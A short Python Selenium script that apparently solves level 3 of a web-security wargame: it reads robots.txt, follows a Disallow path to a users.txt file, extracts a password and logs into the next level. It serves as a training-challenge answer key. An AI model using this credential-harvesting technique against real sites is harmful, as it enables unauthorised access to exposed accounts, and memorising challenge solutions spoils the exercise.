from common import *

def solve(driver, _ = None):
    driver.get(build_url(level=3, end_arguments="robots.txt"))
    file_lines = driver.find_element_by_tag_name("body").text.split("\n")
    for line in file_lines:
        if "Disallow" in line:
            path = line.split(" ")[1]+"/users.txt"
            break
    else:
        raise RuntimeError("password not found")
    
    driver.get(build_url(level=3, end_arguments=path))
    password = driver.find_element_by_tag_name("body").text.split(":")[1]
    driver.get(build_url(password=password, level=4))
    return password